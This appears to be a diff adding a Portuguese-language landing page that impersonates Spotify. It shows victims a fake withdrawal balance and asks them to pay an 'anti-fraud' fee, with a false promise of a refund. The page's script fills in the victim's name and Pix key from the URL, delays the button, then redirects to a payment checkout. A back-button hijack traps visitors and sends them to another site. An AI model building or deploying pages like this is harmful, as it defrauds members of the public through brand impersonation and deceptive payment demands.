@@ -1,0 +1,222 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Spotify</title>
+
+  <!-- FONT GOOGLE POPPINS -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      justify-content: space-around;
+      display: flex;
+      flex-direction: column;
+      background-color: rgb(24, 24, 24);
+      align-items: center;
+    }
+    .centralizado {
+      margin-top: 70px;
+      width: 300px;
+      background-color: rgb(0, 0, 0);
+      text-align: center;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      align-items: center;
+      border-radius: 10px;
+    }
+    * {
+      font-family: "Poppins", sans-serif;
+      color: white;
+      padding: 0px;
+    }
+    #logocentral {
+      width: 90px;
+    }
+    #textoprincipalsptfy {
+      font-size: 23px;
+      margin: 20px 0px;
+      font-weight: 700;
+    }
+    #descricaoiniciospotify {
+      color: rgb(168, 168, 168);
+      margin-top: -10px;
+      margin-bottom: -10px;
+      font-size: 14px;
+    }
+    #descricaoiniciospotifyy {
+      color: rgb(168, 168, 168);
+      font-size: 14px;
+      font-weight: 500;
+    }
+    #logincadastro {
+      display: flex;
+      font-size: 15px;
+      width: 100%;
+      flex-direction: column;
+      text-align: left;
+    }
+    #meuBotao {
+      display: block;
+      padding: 13px 10px;
+      background-color: gray;
+      color: white;
+      margin-top: 20px;
+      border-radius: 50px;
+      border: 1px solid gray;
+      text-decoration: none;
+      width: 90%;
+      font-weight: 600;
+      text-align: center;
+      pointer-events: none;
+    }
+    #topoFixo {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background-color: #000000;
+      color: white;
+      padding: 15px 10px;
+      align-items: center;
+      display: flex;
+      justify-content: space-between;
+      text-align: center;
+    }
+    #logo {
+      width: 130px;
+    }
+    #saldoatual {
+      padding: 10px 15px;
+      border-radius: 10px;
+      margin-right: 20px;
+      background-color: rgb(7, 187, 52);
+    }
+    #txtnotificacao {
+      color: white;
+    }
+    #notificacao {
+      background-color: rgba(1, 214, 97, 0.434);
+      display: flex;
+      margin-top: -10px;
+      align-items: center;
+      margin-bottom: 20px;
+      text-align: center;
+      font-size: 14px;
+      justify-content: center;
+      width: 100%;
+      border-radius: 10px;
+      border: 1px solid rgb(1, 214, 97);
+    }
+  </style>
+</head>
+<body>
+  <!-- TOPO FIXO -->
+  <div id="topoFixo">
+    <img src="images/logo.png" id="logo">
+    <div id="saldoatual">Saldo: R$ 382,76</div>
+  </div>
+
+  <div class="centralizado">
+    <!-- IMAGEM DA LOGO -->
+    <img src="images/logowhite.png" id="logocentral">
+
+    <!-- TEXTO POP UP -->
+    <div id="textoprincipalsptfy">
+      Parabéns, <b id="mensagem">...</b>!
+    </div>
+
+    <div id="notificacao">
+      <p id="txtnotificacao">
+        Enviando <b>R$ 382,76</b> para a chave pix <b id="pix">.</b>
+      </p>
+    </div>
+
+    <!-- DESCRICAO -->
+    <p id="descricaoiniciospotify">
+      Usamos uma taxa <b>anti-fraudes</b> para evitar abusos nos saques.<br><br>
+      Você receberá o valor da taxa <b>de volta</b> junto com seu saque. <br><br>
+      Seu saldo está retido. É possível usar parte dele para cobrir até 50% da taxa,
+      reduzindo de R$ 39,80 para <b>R$ 19,90</b>.
+    </p>
+
+    <!-- BOTÃO COM LINK -->
+    <a href="#" id="meuBotao">LIBERANDO SAQUE...</a>
+
+    <script>
+      function obterParametroDaUrl(nome) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(nome);
+      }
+
+      const nome = obterParametroDaUrl("nome");
+      const pix = obterParametroDaUrl("pix");
+
+      if (nome) {
+        document.getElementById("mensagem").innerText = `${nome}`;
+      }
+      if (pix) {
+        document.getElementById("pix").innerText = `${pix}`;
+      }
+
+      function mudarBotao() {
+        const botao = document.getElementById("meuBotao");
+        botao.style.backgroundColor = "rgb(1, 214, 97)";
+        botao.style.borderColor = "rgb(1, 214, 97)";
+        botao.style.cursor = "pointer";
+        botao.innerText = "FINALIZAR VERIFICAÇÃO E RECEBER";
+        botao.style.pointerEvents = "auto";
+
+        botao.onclick = function (e) {
+          e.preventDefault();
+          const baseUrl = "https://go.perfectpay.com.br/PPU38CQ09NE";
+          const params = new URLSearchParams(window.location.search);
+          const utms = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"]
+            .map(param => {
+              const value = params.get(param);
+              return value ? `${param}=${encodeURIComponent(value)}` : "";
+            })
+            .filter(Boolean)
+            .join("&");
+
+          const finalUrl = utms ? `${baseUrl}?${utms}` : baseUrl;
+
+          if (typeof utmify !== "undefined") {
+            utmify.redirect(finalUrl);
+          } else {
+            window.location.href = finalUrl;
+          }
+        };
+      }
+
+      setTimeout(mudarBotao, 15000);
+    </script>
+
+    <p id="descricaoiniciospotifyy">
+      Este site é protegido pelo reCAPTCHA e está sujeito à
+      <b style="color: rgb(1, 214, 97); font-weight: 500;">Política de Privacidade</b>
+      e aos
+      <b style="color: rgb(1, 214, 97); font-weight: 500;">Termos de Serviço do Google.</b>
+    </p>
+  </div>
+
+  <!-- SCRIPT DO UTMFY -->
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  
+ <!-- BACK REDIRECT: volta -> redireciona -->
+  <script>
+    (function() {
+      history.pushState(null, '', location.href);
+      window.onpopstate = function () {
+        location.href = "https://acessaragora.shop/branca/back01/"; // 🟡 Substitua pela URL de redirecionamento
+      };
+    })();
+  </script>
+
+</body></html>
